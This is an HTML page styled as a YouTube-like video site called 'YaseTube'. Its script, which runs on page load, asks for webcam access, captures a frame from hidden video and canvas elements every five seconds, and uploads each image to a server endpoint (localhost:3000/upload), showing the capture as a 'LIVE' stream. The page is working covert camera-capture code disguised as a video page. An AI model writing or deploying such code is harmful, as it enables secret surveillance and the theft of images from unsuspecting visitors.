<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YaseTube - Live Capture</title>
    <style>
        /* --- 全局样式和重置 --- */
        :root {
            --background-primary: #181818;
            --background-secondary: #282828;
            --background-tertiary: #3d3d3d;
            --text-primary: #ffffff;
            --text-secondary: #aaaaaa;
            --accent-color: #ff0000;
        }

        body {
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0;
            background-color: var(--background-primary);
            color: var(--text-primary);
        }

        /* --- 头部 Header --- */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 24px;
            height: 56px;
            background-color: var(--background-secondary);
            border-bottom: 1px solid var(--background-tertiary);
        }

        .header .logo {
            display: flex;
            align-items: center;
            font-size: 20px;
            font-weight: bold;
        }
        
        .header .logo .logo-accent {
            background-color: var(--accent-color);
            color: var(--text-primary);
            padding: 4px 8px;
            border-radius: 6px;
            margin-left: 6px;
        }

        .header .search-bar {
            display: flex;
            flex-grow: 1;
            max-width: 600px;
            margin: 0 40px;
        }
        
        .header .search-bar input {
            width: 100%;
            padding: 8px 12px;
            background-color: #121212;
            border: 1px solid var(--background-tertiary);
            border-radius: 20px 0 0 20px;
            color: var(--text-primary);
            font-size: 16px;
        }

        .header .search-bar button {
            padding: 0 20px;
            background-color: var(--background-tertiary);
            border: 1px solid var(--background-tertiary);
            border-left: none;
            border-radius: 0 20px 20px 0;
            cursor: pointer;
        }
        
        .header .user-profile img {
            width: 32px;
            height: 32px;
            border-radius: 50%;
        }

        /* --- 主内容区 --- */
        .main-content {
            display: flex;
            padding: 24px;
            gap: 24px;
        }
        
        .video-player-container {
            flex-grow: 1;
        }

        /* --- 视频“播放器” --- */
        .video-player {
            width: 100%;
            aspect-ratio: 16 / 9; /* 保持16:9的宽高比 */
            background-color: #000;
            border-radius: 12px;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        #previewImage {
            width: 100%;
            height: 100%;
            object-fit: cover; /* 覆盖整个容器，可能会裁剪 */
        }
        
        .live-indicator {
            position: absolute;
            top: 15px;
            left: 15px;
            background-color: var(--accent-color);
            color: var(--text-primary);
            padding: 4px 10px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .live-indicator::before {
            content: '';
            width: 8px;
            height: 8px;
            background-color: var(--text-primary);
            border-radius: 50%;
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }

        /* --- 视频侧边栏 --- */
        .video-sidebar {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        
        .video-thumbnail {
            display: flex;
            gap: 12px;
            cursor: pointer;
        }
        
        .video-thumbnail img {
            width: 168px;
            height: 94px;
            border-radius: 8px;
            background-color: var(--background-tertiary);
        }

        .video-thumbnail .video-info {
            display: flex;
            flex-direction: column;
        }
        
        .video-thumbnail .video-info .title {
            font-size: 14px;
            font-weight: 500;
            color: var(--text-primary);
            margin-bottom: 6px;
        }

        .video-thumbnail .video-info .channel,
        .video-thumbnail .video-info .views {
            font-size: 12px;
            color: var(--text-secondary);
        }

        /* 核心功能的隐藏元素 */
        #webcam, #canvas {
            display: none;
        }

    </style>
</head>
<body>

    <header class="header">
        <div class="logo">
            <svg height="24" viewBox="0 0 24 24" fill="white"><path d="M21.582,6.186c-0.23-0.86-0.908-1.538-1.768-1.768C18.254,4,12,4,12,4S5.746,4,4.186,4.418 c-0.86,0.23-1.538,0.908-1.768,1.768C2,7.746,2,12,2,12s0,4.254,0.418,5.814c0.23,0.86,0.908,1.538,1.768,1.768 C5.746,20,12,20,12,20s6.254,0,7.814-0.418c0.861-0.23,1.538-0.908,1.768-1.768C22,16.254,22,12,22,12S22,7.746,21.582,6.186z M10,15.464V8.536L16,12L10,15.464z"></path></svg>
            <span>Yase<span class="logo-accent">Tube</span></span>
        </div>
        <div class="search-bar">
            <input type="text" placeholder="搜索">
            <button>
                <svg height="20" viewBox="0 0 24 24" fill="white"><path d="M20.87,20.17l-5.59-5.59C16.35,13.35,17,11.75,17,10c0-3.87-3.13-7-7-7s-7,3.13-7,7s3.13,7,7,7c1.75,0,3.35-0.65,4.58-1.71 l5.59,5.59L20.87,20.17z M10,16c-3.31,0-6-2.69-6-6s2.69-6,6-6s6,2.69,6,6S13.31,16,10,16z"></path></svg>
            </button>
        </div>
        <div class="user-profile">
            <svg height="32" viewBox="0 0 24 24" fill="#aaa"><path d="M12,12c2.21,0,4-1.79,4-4s-1.79-4-4-4s-4,1.79-4,4S9.79,12,12,12z M12,14c-2.67,0-8,1.34-8,4v2h16v-2 C20,15.34,14.67,14,12,14z"></path></svg>
        </div>
    </header>

    <main class="main-content">
        <div class="video-player-container">
            <div class="video-player">
                <img id="previewImage" alt="Live Capture Stream"/>
                <div class="live-indicator">
                    <span>LIVE</span>
                </div>
            </div>
            </div>

        <aside class="video-sidebar">
            <div class="video-thumbnail">
                <img alt="thumbnail">
                <div class="video-info">
                    <span class="title">下一个视频推荐标题</span>
                    <span class="channel">频道名称</span>
                    <span class="views">12万次观看 · 1天前</span>
                </div>
            </div>
            <div class="video-thumbnail">
                <img alt="thumbnail">
                <div class="video-info">
                    <span class="title">学习如何用CSS设计网页布局</span>
                    <span class="channel">编码助手</span>
                    <span class="views">8.8万次观看 · 3周前</span>
                </div>
            </div>
             <div class="video-thumbnail">
                <img alt="thumbnail">
                <div class="video-info">
                    <span class="title">探索自然风光的壮丽景色</span>
                    <span class="channel">旅行家</span>
                    <span class="views">233万次观看 · 2个月前</span>
                </div>
            </div>
        </aside>
    </main>

    <video id="webcam" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const webcamVideo = document.getElementById('webcam');
        const canvas = document.getElementById('canvas');
        const previewImage = document.getElementById('previewImage');
        
        let stream;
        let isUploading = false;
        const UPLOAD_INTERVAL = 5000; // 5秒

        // 核心的拍照上传函数
        async function captureAndUpload() {
            if (isUploading || !stream) {
                return;
            }

            isUploading = true;

            const videoSettings = stream.getVideoTracks()[0].getSettings();
            canvas.width = videoSettings.width;
            canvas.height = videoSettings.height;

            const context = canvas.getContext('2d');
            context.drawImage(webcamVideo, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                // 更新图片预览（非文字反馈）
                // 使用 URL.createObjectURL 会有内存泄漏风险，在不需要旧预览时最好释放
                if (previewImage.src) {
                    URL.revokeObjectURL(previewImage.src);
                }
                previewImage.src = URL.createObjectURL(blob);
                
                const formData = new FormData();
                formData.append('photo', blob, `capture-${Date.now()}.jpg`);
                
                try {
                    const response = await fetch('http://localhost:3000/upload', {
                        method: 'POST',
                        body: formData,
                    });

                    if (response.ok) {
                        console.log('Upload successful');
                    } else {
                        console.error('Upload failed:', response.statusText);
                    }
                } catch (error) {
                    console.error('Upload error:', error);
                } finally {
                    isUploading = false;
                }

            }, 'image/jpeg', 0.9);
        }

        // 初始化摄像头并启动定时器
        async function init() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 1280, height: 720 }, 
                    audio: false 
                });
                webcamVideo.srcObject = stream;
                
                webcamVideo.onloadedmetadata = () => {
                    // 摄像头就绪后，直接启动定时器
                    setInterval(captureAndUpload, UPLOAD_INTERVAL);
                };

            } catch (error) {
                // 如果用户拒绝授权，这个错误会在控制台显示
                console.error('Camera access denied or error:', error);
            }
        }

        // 启动
        init();
    </script>

</body>
</html>
